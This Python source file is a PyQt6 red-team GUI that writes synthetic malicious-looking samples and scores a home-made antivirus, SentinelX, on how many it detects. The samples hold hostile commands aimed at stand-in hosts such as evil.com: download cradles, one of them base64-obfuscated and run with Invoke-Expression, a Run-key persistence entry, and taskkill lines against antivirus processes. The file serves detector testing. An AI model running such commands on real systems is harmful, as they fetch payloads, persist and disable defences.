"""
SentinelX Red Team — Adversarial Testing Platform
Standalone application for testing SentinelX defences.

Run:
    python red_team_gui.py

Requires SentinelX to be installed in the same folder or
specify the path via Settings.
"""

import os
import sys
import base64
import random
import string
import shutil
import tempfile
import threading
import time

from PyQt6.QtWidgets import (
    QApplication, QWidget, QMainWindow, QVBoxLayout, QHBoxLayout,
    QFrame, QLabel, QPushButton, QTextEdit, QFileDialog,
    QProgressBar, QStackedWidget, QTableWidget, QTableWidgetItem,
    QHeaderView, QAbstractItemView, QLineEdit, QSpinBox, QMessageBox
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QColor, QFont

# ── Palette (mirrors SentinelX theme) ────────────────────────────────────────
BG         = "#0A0F1C"
PANEL      = "#111827"
PANEL_ALT  = "#161F32"
BORDER     = "#1F2A3D"
ACCENT     = "#FF3B3B"        # Red Team uses red as accent instead of cyan
ACCENT2    = "#FF6B35"        # orange for secondary
SAFE       = "#00FF99"
DANGER     = "#FF3B3B"
WARNING    = "#FFB020"
CYAN       = "#00F5FF"
TEXT       = "#E6F1FF"
TEXT_DIM   = "#7C8AA5"

GLOBAL_QSS = f"""
QWidget {{
    background-color: {BG};
    color: {TEXT};
    font-family: Segoe UI, Arial;
    font-size: 14px;
}}
QScrollBar:vertical {{
    background: {BG}; width: 10px;
}}
QScrollBar::handle:vertical {{
    background: {BORDER}; border-radius: 5px; min-height: 24px;
}}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{
    height: 0px;
}}
QToolTip {{
    background-color: {PANEL_ALT}; color: {TEXT};
    border: 1px solid {ACCENT}; padding: 6px; border-radius: 6px;
}}
"""

# ── Attack definitions ────────────────────────────────────────────────────────
ATTACK_TYPES = [
    {
        "id":          1,
        "name":        "Obvious",
        "icon":        "💀",
        "ext":         ".bat",
        "description": "Clear malicious keywords + suspicious extension.\nExpected: caught by Heuristic immediately.",
        "difficulty":  "Easy to detect",
        "diff_color":  SAFE,
    },
    {
        "id":          2,
        "name":        "Obfuscated",
        "icon":        "🔐",
        "ext":         ".ps1",
        "description": "Payload encoded in Base64 — no plain keywords.\nExpected: missed by Heuristic, caught by AI.",
        "difficulty":  "Medium",
        "diff_color":  WARNING,
    },
    {
        "id":          3,
        "name":        "Low Entropy",
        "icon":        "🎭",
        "ext":         ".txt",
        "description": "Malicious intent hidden in normal prose text.\nExpected: evades both Heuristic and AI.",
        "difficulty":  "Hard — known weakness",
        "diff_color":  DANGER,
    },
    {
        "id":          4,
        "name":        "Spoofed Ext",
        "icon":        "🎪",
        "ext":         ".txt",
        "description": "Dangerous content with innocent .txt extension.\nExpected: caught by Heuristic (keyword score).",
        "difficulty":  "Medium",
        "diff_color":  WARNING,
    },
    {
        "id":          5,
        "name":        "Polymorphic",
        "icon":        "🔄",
        "ext":         ".bat",
        "description": "Randomised structure — different every run.\nExpected: caught by Heuristic or AI.",
        "difficulty":  "Medium",
        "diff_color":  WARNING,
    },
]


# ── File generators ───────────────────────────────────────────────────────────
def generate_obvious(path):
    with open(path, "w", encoding="utf-8") as f:
        f.write("@echo off\n")
        f.write("powershell -hidden -command wget http://evil.com/payload.exe\n")
        f.write("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /t REG_SZ /d malware.bat\n")
        f.write("taskkill /F /IM antivirus.exe\n")
        f.write("curl -O http://c2.server.net/backdoor.dll\n")


def generate_obfuscated(path):
    payload = "powershell -hidden -command wget http://evil.com/rat.exe"
    encoded = base64.b64encode(payload.encode()).decode()
    with open(path, "w", encoding="utf-8") as f:
        f.write("# System update script\n")
        f.write(f"$encoded = '{encoded}'\n")
        f.write("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))\n")
        f.write("Invoke-Expression $decoded\n")
        for _ in range(3):
            extra = base64.b64encode(os.urandom(40)).decode()
            f.write(f"# config: {extra}\n")


def generate_low_entropy(path):
    with open(path, "w", encoding="utf-8") as f:
        f.write("Dear system administrator,\n\n")
        f.write("Please run the attached maintenance routine at your earliest convenience.\n")
        f.write("The routine will optimize registry performance and network connectivity.\n")
        f.write("Contact support if you experience any issues during execution.\n\n")
        f.write("Best regards,\nIT Department\n\n")
        f.write("Note: execute via shell using standard interpreter flags for silent mode.\n")
        f.write("Target: system binary manager, network downloader utility, process terminator.\n")


def generate_spoofed(path):
    with open(path, "w", encoding="utf-8") as f:
        f.write("powershell -hidden wget http://malware.net/payload\n")
        f.write("reg add HKLM\\run /v evil /t REG_SZ /d c:\\malware.exe\n")
        f.write("taskkill /F /IM defender.exe\n")
        f.write("curl -O http://c2.server/backdoor\n")


def generate_polymorphic(path):
    var1    = "".join(random.choices(string.ascii_lowercase, k=8))
    var2    = "".join(random.choices(string.ascii_lowercase, k=6))
    comment = "".join(random.choices(string.ascii_letters + string.digits, k=20))
    commands = [
        f"powershell -hidden -enc {base64.b64encode(os.urandom(30)).decode()}",
        f"wget http://{''.join(random.choices(string.ascii_lowercase, k=8))}.net/payload",
        f"reg add HKLM\\Software\\{comment} /v {var1} /t REG_SZ /d {var2}.exe",
        f"taskkill /F /IM {''.join(random.choices(string.ascii_lowercase, k=6))}.exe",
        f"curl -O http://{''.join(random.choices(string.ascii_lowercase, k=6))}.ru/dropper",
    ]
    random.shuffle(commands)
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"@echo off\n:: {comment}\n")
        for cmd in commands:
            f.write(f"{cmd}\n")


GENERATORS = {
    1: generate_obvious,
    2: generate_obfuscated,
    3: generate_low_entropy,
    4: generate_spoofed,
    5: generate_polymorphic,
}


# ── Signal bridge for thread-safe UI updates ─────────────────────────────────
class SignalBridge(QObject):
    log_signal    = pyqtSignal(str, str)   # message, color
    result_signal = pyqtSignal(dict)
    done_signal   = pyqtSignal(dict)


# ════════════════════════════════════════════════════════════════════════════
# MAIN WINDOW
# ════════════════════════════════════════════════════════════════════════════
class RedTeamGUI(QMainWindow):

    def __init__(self, sentinelx_path=None):
        super().__init__()
        self.sentinelx_path = sentinelx_path or os.path.dirname(os.path.abspath(__file__))
        self.selected_attacks = set()
        self.runs_per_type    = 5
        self.is_running       = False
        self.results          = []
        self.bridge           = SignalBridge()

        self.bridge.log_signal.connect(self._append_log)
        self.bridge.result_signal.connect(self._add_result_row)
        self.bridge.done_signal.connect(self._on_done)

        self._setup_sentinelx_path()
        self._build_ui()
        self.setWindowTitle("SentinelX Red Team — Adversarial Testing Platform")
        self.setGeometry(150, 80, 1300, 780)
        self.setMinimumSize(1100, 650)
        self.setStyleSheet(GLOBAL_QSS)

    def _setup_sentinelx_path(self):
        if self.sentinelx_path not in sys.path:
            sys.path.insert(0, self.sentinelx_path)

    # ── UI Construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QHBoxLayout()
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)
        central.setLayout(root)

        root.addWidget(self._build_sidebar())
        root.addWidget(self._build_main_area(), 1)

    def _build_sidebar(self):
        sidebar = QFrame()
        sidebar.setFixedWidth(260)
        sidebar.setStyleSheet(f"QFrame {{ background-color: {PANEL}; border-right: 1px solid {BORDER}; }}")

        layout = QVBoxLayout()
        layout.setContentsMargins(16, 20, 16, 20)
        layout.setSpacing(6)

        # Logo
        logo = QLabel("☠ RED TEAM")
        logo.setStyleSheet(f"font-size: 22px; font-weight: 800; color: {ACCENT}; border: none; padding: 8px 0;")
        layout.addWidget(logo)

        sub = QLabel("ADVERSARIAL TESTING PLATFORM")
        sub.setStyleSheet(f"font-size: 9px; font-weight: 700; letter-spacing: 2px; color: {TEXT_DIM}; border: none; padding-bottom: 14px;")
        layout.addWidget(sub)

        # SentinelX path
        path_label = QLabel("SentinelX path:")
        path_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 11px; border: none;")
        layout.addWidget(path_label)

        path_row = QHBoxLayout()
        self.path_display = QLineEdit(self.sentinelx_path)
        self.path_display.setReadOnly(True)
        self.path_display.setStyleSheet(f"""
            QLineEdit {{
                background: {PANEL_ALT}; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 5px 8px; font-size: 11px;
            }}
        """)
        path_row.addWidget(self.path_display)
        browse_btn = QPushButton("…")
        browse_btn.setFixedSize(32, 32)
        browse_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        browse_btn.setStyleSheet(f"""
            QPushButton {{
                background: {PANEL_ALT}; color: {TEXT}; border: 1px solid {BORDER};
                border-radius: 6px; font-weight: 700;
            }}
            QPushButton:hover {{ border-color: {ACCENT}; color: {ACCENT}; }}
        """)
        browse_btn.clicked.connect(self._browse_sentinelx)
        path_row.addWidget(browse_btn)
        layout.addLayout(path_row)

        sep = QFrame()
        sep.setFixedHeight(1)
        sep.setStyleSheet(f"background-color: {BORDER}; border: none; margin: 10px 0;")
        layout.addWidget(sep)

        # Attack type selector
        select_label = QLabel("SELECT ATTACK TYPES")
        select_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        layout.addWidget(select_label)

        self.attack_buttons = {}
        for attack in ATTACK_TYPES:
            btn = self._make_attack_button(attack)
            layout.addWidget(btn)
            self.attack_buttons[attack["id"]] = btn

        sel_all = QPushButton("Select All")
        sel_all.setCursor(Qt.CursorShape.PointingHandCursor)
        sel_all.setStyleSheet(f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 8px; padding: 6px; font-size: 12px;
            }}
            QPushButton:hover {{ color: {TEXT}; border-color: {TEXT_DIM}; }}
        """)
        sel_all.clicked.connect(self._select_all)
        layout.addWidget(sel_all)

        sep2 = QFrame()
        sep2.setFixedHeight(1)
        sep2.setStyleSheet(f"background-color: {BORDER}; border: none; margin: 10px 0;")
        layout.addWidget(sep2)

        # Runs per type
        runs_label = QLabel("RUNS PER TYPE")
        runs_label.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        layout.addWidget(runs_label)

        self.runs_spin = QSpinBox()
        self.runs_spin.setRange(1, 20)
        self.runs_spin.setValue(5)
        self.runs_spin.setStyleSheet(f"""
            QSpinBox {{
                background: {PANEL_ALT}; color: {TEXT}; border: 1px solid {BORDER};
                border-radius: 8px; padding: 8px; font-size: 13px;
            }}
            QSpinBox:hover {{ border-color: {ACCENT}; }}
        """)
        self.runs_spin.valueChanged.connect(lambda v: setattr(self, "runs_per_type", v))
        layout.addWidget(self.runs_spin)

        layout.addStretch()

        # Status pill
        self.status_pill = QLabel("● READY")
        self.status_pill.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status_pill.setStyleSheet(f"""
            color: {SAFE}; border: 1px solid {SAFE}; border-radius: 8px;
            padding: 8px; font-weight: 700; font-size: 11px;
        """)
        layout.addWidget(self.status_pill)

        sidebar.setLayout(layout)
        return sidebar

    def _make_attack_button(self, attack):
        btn = QPushButton(f"  {attack['icon']}  {attack['name']}")
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setCheckable(True)
        btn.setToolTip(attack["description"])
        btn.setStyleSheet(self._attack_btn_style(False))
        btn.toggled.connect(lambda checked, aid=attack["id"]: self._toggle_attack(aid, checked))
        return btn

    def _attack_btn_style(self, active):
        if active:
            return f"""
                QPushButton {{
                    background: rgba(255, 59, 59, 0.15); color: {ACCENT};
                    border: 1px solid {ACCENT}; border-radius: 10px;
                    padding: 10px 14px; font-size: 13px; font-weight: 700; text-align: left;
                }}
            """
        return f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM};
                border: 1px solid transparent; border-radius: 10px;
                padding: 10px 14px; font-size: 13px; font-weight: 600; text-align: left;
            }}
            QPushButton:hover {{ background: {PANEL_ALT}; color: {TEXT}; }}
        """

    def _build_main_area(self):
        widget = QWidget()
        layout = QVBoxLayout()
        layout.setContentsMargins(24, 20, 24, 20)
        layout.setSpacing(14)
        widget.setLayout(layout)

        # Header
        header = QHBoxLayout()
        title_block = QVBoxLayout()
        title_block.setSpacing(2)
        title = QLabel("Attack Console")
        title.setStyleSheet(f"font-size: 22px; font-weight: 800; color: {TEXT}; border: none;")
        title_block.addWidget(title)
        subtitle = QLabel("Generate adversarial attacks and observe SentinelX responses in real time.")
        subtitle.setStyleSheet(f"font-size: 12px; color: {TEXT_DIM}; border: none;")
        title_block.addWidget(subtitle)
        header.addLayout(title_block)
        header.addStretch()

        self.run_button = QPushButton("⚡  LAUNCH ATTACK")
        self.run_button.setCursor(Qt.CursorShape.PointingHandCursor)
        self.run_button.setStyleSheet(f"""
            QPushButton {{
                background: {ACCENT}; color: white; padding: 14px 24px;
                border-radius: 10px; font-size: 15px; font-weight: 800; border: none;
            }}
            QPushButton:hover {{ background: #FF6B6B; }}
            QPushButton:disabled {{ background: {BORDER}; color: {TEXT_DIM}; }}
        """)
        self.run_button.clicked.connect(self._launch_attack)
        header.addWidget(self.run_button, 0, Qt.AlignmentFlag.AlignTop)
        layout.addLayout(header)

        # Progress bar
        self.progress = QProgressBar()
        self.progress.setVisible(False)
        self.progress.setStyleSheet(f"""
            QProgressBar {{
                background: {PANEL}; border: 1px solid {BORDER}; border-radius: 6px;
                height: 8px; text-align: center;
            }}
            QProgressBar::chunk {{
                background: {ACCENT}; border-radius: 6px;
            }}
        """)
        self.progress.setFixedHeight(8)
        layout.addWidget(self.progress)

        # Stats row
        stats_row = QHBoxLayout()
        stats_row.setSpacing(12)
        self.stat_total   = self._make_stat("ATTACKS SENT",   "0", TEXT)
        self.stat_caught  = self._make_stat("CAUGHT",         "0", SAFE)
        self.stat_missed  = self._make_stat("MISSED",         "0", DANGER)
        self.stat_rate    = self._make_stat("DETECTION RATE", "—", CYAN)
        for s in [self.stat_total, self.stat_caught, self.stat_missed, self.stat_rate]:
            stats_row.addWidget(s)
        layout.addLayout(stats_row)

        # Log + Results split
        split = QHBoxLayout()
        split.setSpacing(14)

        # Live log
        log_card = QFrame()
        log_card.setStyleSheet(f"QFrame {{ background: {PANEL}; border: 1px solid {BORDER}; border-radius: 12px; }}")
        log_layout = QVBoxLayout()
        log_layout.setContentsMargins(16, 14, 16, 14)
        log_title = QLabel("LIVE ATTACK LOG")
        log_title.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        log_layout.addWidget(log_title)
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet(f"""
            QTextEdit {{
                background: {BG}; color: {ACCENT}; border: 1px solid {BORDER};
                border-radius: 8px; padding: 10px;
                font-family: Consolas, 'Courier New', monospace; font-size: 12px;
            }}
        """)
        log_layout.addWidget(self.log_output)
        log_card.setLayout(log_layout)
        split.addWidget(log_card, 1)

        # Results table
        results_card = QFrame()
        results_card.setStyleSheet(f"QFrame {{ background: {PANEL}; border: 1px solid {BORDER}; border-radius: 12px; }}")
        results_layout = QVBoxLayout()
        results_layout.setContentsMargins(16, 14, 16, 14)

        res_header_row = QHBoxLayout()
        res_title = QLabel("RESULTS")
        res_title.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        res_header_row.addWidget(res_title)
        res_header_row.addStretch()
        clear_btn = QPushButton("Clear")
        clear_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        clear_btn.setStyleSheet(f"""
            QPushButton {{
                background: transparent; color: {TEXT_DIM}; border: 1px solid {BORDER};
                border-radius: 6px; padding: 4px 10px; font-size: 11px;
            }}
            QPushButton:hover {{ color: {TEXT}; border-color: {TEXT_DIM}; }}
        """)
        clear_btn.clicked.connect(self._clear_results)
        res_header_row.addWidget(clear_btn)
        results_layout.addLayout(res_header_row)

        self.results_table = QTableWidget()
        self.results_table.setColumnCount(4)
        self.results_table.setHorizontalHeaderLabels(["Attack", "Heuristic", "AI", "Result"])
        self.results_table.setStyleSheet(f"""
            QTableWidget {{
                background: {BG}; alternate-background-color: {PANEL_ALT};
                color: {TEXT}; gridline-color: {BORDER}; border: 1px solid {BORDER};
                border-radius: 8px; font-size: 12px;
                selection-background-color: rgba(255,59,59,0.2);
            }}
            QHeaderView::section {{
                background: {PANEL_ALT}; color: {ACCENT}; padding: 8px;
                border: none; border-bottom: 2px solid {BORDER}; font-weight: 700; font-size: 11px;
            }}
            QTableWidget::item {{ padding: 4px; border-bottom: 1px solid {BORDER}; }}
        """)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.verticalHeader().setVisible(False)
        self.results_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.results_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.results_table.setColumnWidth(1, 100)
        self.results_table.setColumnWidth(2, 120)
        self.results_table.setColumnWidth(3, 100)
        results_layout.addWidget(self.results_table)
        results_card.setLayout(results_layout)
        split.addWidget(results_card, 1)

        layout.addLayout(split, 1)
        return widget

    def _make_stat(self, label, value, color):
        card = QFrame()
        card.setStyleSheet(f"QFrame {{ background: {PANEL}; border: 1px solid {BORDER}; border-radius: 12px; }}")
        card.setMinimumHeight(90)
        layout = QVBoxLayout()
        layout.setContentsMargins(16, 12, 16, 12)
        layout.setSpacing(4)
        lbl = QLabel(label)
        lbl.setStyleSheet(f"color: {TEXT_DIM}; font-size: 10px; font-weight: 700; letter-spacing: 1px; border: none;")
        layout.addWidget(lbl)
        val = QLabel(value)
        val.setStyleSheet(f"color: {color}; font-size: 26px; font-weight: 800; border: none;")
        layout.addWidget(val)
        layout.addStretch()
        card.setLayout(layout)
        card._value_label = val
        return card

    # ── Event handlers ────────────────────────────────────────────────────────

    def _toggle_attack(self, attack_id, checked):
        if checked:
            self.selected_attacks.add(attack_id)
        else:
            self.selected_attacks.discard(attack_id)
        btn = self.attack_buttons[attack_id]
        btn.setStyleSheet(self._attack_btn_style(checked))

    def _select_all(self):
        for btn in self.attack_buttons.values():
            btn.setChecked(True)

    def _browse_sentinelx(self):
        folder = QFileDialog.getExistingDirectory(self, "Select SentinelX folder", self.sentinelx_path)
        if folder:
            self.sentinelx_path = folder
            self.path_display.setText(folder)
            self._setup_sentinelx_path()

    def _launch_attack(self):
        if self.is_running:
            return

        if not self.selected_attacks:
            QMessageBox.warning(self, "No attacks selected", "Please select at least one attack type.")
            return

        self.is_running = True
        self.results.clear()
        self.results_table.setRowCount(0)
        self.log_output.clear()
        self._reset_stats()

        self.run_button.setEnabled(False)
        self.run_button.setText("ATTACKING…")
        self.progress.setVisible(True)

        self.status_pill.setText("● ATTACKING")
        self.status_pill.setStyleSheet(f"""
            color: {ACCENT}; border: 1px solid {ACCENT}; border-radius: 8px;
            padding: 8px; font-weight: 700; font-size: 11px;
        """)

        total = len(self.selected_attacks) * self.runs_per_type
        self.progress.setMaximum(total)
        self.progress.setValue(0)

        thread = threading.Thread(target=self._run_attacks, daemon=True)
        thread.start()

    def _run_attacks(self):
        """Runs in background thread."""
        try:
            from core.heuristic_engine import heuristic_analysis
            from core.hash_checker import is_malicious_hash
            try:
                from ai.model import predict_file, is_model_ready
                ai_ok = is_model_ready()
            except Exception:
                ai_ok = False

            work_dir = tempfile.mkdtemp(prefix="sentinelx_redteam_")

            self.bridge.log_signal.emit(
                f"=== RED TEAM SESSION STARTED ===", ACCENT
            )
            self.bridge.log_signal.emit(
                f"Attacks: {len(self.selected_attacks)} types × {self.runs_per_type} runs", TEXT_DIM
            )
            if ai_ok:
                self.bridge.log_signal.emit("AI model: LOADED ✓", SAFE)
            else:
                self.bridge.log_signal.emit("AI model: NOT FOUND — skipping AI detection", WARNING)

            done      = 0
            caught    = 0
            missed    = 0
            all_res   = []

            selected = [a for a in ATTACK_TYPES if a["id"] in self.selected_attacks]

            for attack in selected:
                self.bridge.log_signal.emit(
                    f"\n▶ Attack {attack['id']}: {attack['name']} ({attack['description'].split(chr(10))[0]})",
                    ACCENT2
                )

                gen = GENERATORS[attack["id"]]

                for run in range(1, self.runs_per_type + 1):
                    fname = f"attack_{attack['id']}_run{run}{attack['ext']}"
                    fpath = os.path.join(work_dir, fname)
                    gen(fpath)
                    time.sleep(0.05)

                    # test
                    result = {
                        "attack":           attack["name"],
                        "hash_caught":      is_malicious_hash(fpath),
                        "heuristic_risk":   heuristic_analysis(fpath),
                        "heuristic_caught": False,
                        "ai_label":         None,
                        "ai_confidence":    None,
                        "ai_caught":        False,
                        "caught":           False,
                        "method":           "MISSED",
                    }
                    result["heuristic_caught"] = (result["heuristic_risk"] == "HIGH")

                    if ai_ok:
                        pred = predict_file(fpath)
                        if pred:
                            result["ai_label"]      = pred["label"]
                            result["ai_confidence"] = pred["confidence"]
                            result["ai_caught"]     = (pred["label"] == "MALWARE")

                    if result["hash_caught"] or result["heuristic_caught"] or result["ai_caught"]:
                        result["caught"] = True
                        methods = []
                        if result["hash_caught"]:      methods.append("Hash")
                        if result["heuristic_caught"]: methods.append("Heuristic")
                        if result["ai_caught"]:        methods.append("AI")
                        result["method"] = " + ".join(methods)
                        caught += 1
                    else:
                        missed += 1

                    all_res.append(result)
                    done += 1

                    # log line
                    icon  = "✓" if result["caught"] else "✗"
                    color = SAFE if result["caught"] else DANGER
                    h     = result["heuristic_risk"]
                    ai_s  = f"{result['ai_label']} {result['ai_confidence']:.0%}" if result["ai_label"] else "N/A"
                    self.bridge.log_signal.emit(
                        f"  Run {run}  {icon}  Heuristic:{h}  AI:{ai_s}  → {result['method']}",
                        color
                    )

                    self.bridge.result_signal.emit(result.copy())

                    QTimer.singleShot(0, lambda v=done: self.progress.setValue(v))

            shutil.rmtree(work_dir, ignore_errors=True)

            rate = caught / done * 100 if done else 0
            self.bridge.done_signal.emit({
                "total":  done,
                "caught": caught,
                "missed": missed,
                "rate":   rate,
                "results": all_res,
            })

        except Exception as e:
            self.bridge.log_signal.emit(f"\nERROR: {e}", DANGER)
            self.bridge.done_signal.emit({"total": 0, "caught": 0, "missed": 0, "rate": 0, "results": []})

    def _append_log(self, message, color):
        self.log_output.append(f'<span style="color:{color}">{message}</span>')

    def _add_result_row(self, result):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)

        attack_item = QTableWidgetItem(result["attack"])
        self.results_table.setItem(row, 0, attack_item)

        h_risk  = result["heuristic_risk"]
        h_color = DANGER if h_risk == "HIGH" else (WARNING if h_risk == "MEDIUM" else TEXT_DIM)
        h_item  = QTableWidgetItem(h_risk)
        h_item.setForeground(QColor(h_color))
        self.results_table.setItem(row, 1, h_item)

        if result["ai_label"]:
            ai_text  = f"{result['ai_label']} {result['ai_confidence']:.0%}"
            ai_color = DANGER if result["ai_label"] == "MALWARE" else SAFE
        else:
            ai_text  = "N/A"
            ai_color = TEXT_DIM
        ai_item = QTableWidgetItem(ai_text)
        ai_item.setForeground(QColor(ai_color))
        self.results_table.setItem(row, 2, ai_item)

        verdict       = result["method"]
        verdict_color = SAFE if result["caught"] else DANGER
        v_item        = QTableWidgetItem(verdict)
        v_item.setForeground(QColor(verdict_color))
        f = v_item.font(); f.setBold(True); v_item.setFont(f)
        self.results_table.setItem(row, 3, v_item)

        # update stats
        total_rows = self.results_table.rowCount()
        caught = sum(
            1 for r in range(total_rows)
            if self.results_table.item(r, 3)
            and self.results_table.item(r, 3).text() != "MISSED"
        )
        missed = total_rows - caught
        rate   = caught / total_rows * 100 if total_rows else 0

        self.stat_total._value_label.setText(str(total_rows))
        self.stat_caught._value_label.setText(str(caught))
        self.stat_missed._value_label.setText(str(missed))
        self.stat_rate._value_label.setText(f"{rate:.0f}%")

    def _on_done(self, summary):
        self.is_running = False
        self.run_button.setEnabled(True)
        self.run_button.setText("⚡  LAUNCH ATTACK")
        self.progress.setVisible(False)

        rate = summary["rate"]
        if rate >= 80:
            pill_color = SAFE
            pill_text  = f"● SESSION COMPLETE — {rate:.0f}% DETECTED"
        elif rate >= 50:
            pill_color = WARNING
            pill_text  = f"● SESSION COMPLETE — {rate:.0f}% DETECTED"
        else:
            pill_color = DANGER
            pill_text  = f"● SESSION COMPLETE — {rate:.0f}% DETECTED"

        self.status_pill.setText(pill_text)
        self.status_pill.setStyleSheet(f"""
            color: {pill_color}; border: 1px solid {pill_color}; border-radius: 8px;
            padding: 8px; font-weight: 700; font-size: 11px;
        """)

        self.bridge.log_signal.emit(
            f"\n{'='*50}\nSESSION COMPLETE\n"
            f"Total: {summary['total']}  Caught: {summary['caught']}  "
            f"Missed: {summary['missed']}  Rate: {rate:.0f}%\n{'='*50}",
            CYAN
        )

    def _clear_results(self):
        self.results_table.setRowCount(0)
        self.log_output.clear()
        self._reset_stats()

    def _reset_stats(self):
        self.stat_total._value_label.setText("0")
        self.stat_caught._value_label.setText("0")
        self.stat_missed._value_label.setText("0")
        self.stat_rate._value_label.setText("—")


# ════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
def run():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    # try to auto-detect SentinelX path
    script_dir = os.path.dirname(os.path.abspath(__file__))
    window = RedTeamGUI(sentinelx_path=script_dir)
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    run()
